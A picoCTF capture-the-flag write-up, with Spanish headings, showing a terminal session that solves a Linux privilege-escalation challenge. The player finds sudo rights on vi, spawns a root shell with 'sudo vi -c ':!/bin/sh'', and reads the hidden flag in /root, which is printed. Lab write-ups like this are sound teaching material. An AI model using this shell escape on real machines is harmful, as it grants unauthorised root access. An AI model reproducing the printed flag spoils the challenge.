## Descripción 
Can you read files in the root file?

Additional details will be available after launching your challenge instance
## Hints
1. What permissions do you have?
## Solución
```
DanielMtzC-picoctf@webshell:~$ ssh -p 60833 picoplayer@saturn.picoctf.net
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.8.0-1035-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Sep 11 03:47:09 2025 from 3.140.102.47
picoplayer@challenge:~$ ls
picoplayer@challenge:~$ ls -la
total 16
drwxr-xr-x 1 picoplayer picoplayer   41 Sep 11 03:54 .
drwxr-xr-x 1 root       root         24 Aug  4  2023 ..
-rw------- 1 picoplayer picoplayer   30 Sep 11 03:54 .bash_history
-rw-r--r-- 1 picoplayer picoplayer  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoplayer picoplayer 3771 Feb 25  2020 .bashrc
drwx------ 2 picoplayer picoplayer   34 Sep 11 03:47 .cache
-rw-r--r-- 1 picoplayer picoplayer  807 Feb 25  2020 .profile
picoplayer@challenge:~$ cd /
picoplayer@challenge:/$ ls
bin  boot  challenge  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
picoplayer@challenge:/$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:/$ sudo vi -c ':!/bin/sh' /dev/null

# ls
bin  boot  challenge  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
# cd root
# ls -la
total 16
drwx------ 1 root root   22 Sep 11 03:54 .
drwxr-xr-x 1 root root   75 Sep 11 03:52 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root  621 Sep 11 03:54 .viminfo
# cat flag.txt
cat: flag.txt: No such file or directory
# cat .flag.txt   
picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}
# Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
DanielMtzC-picoctf@webshell:~$ 
```
## Notas

## Referencias
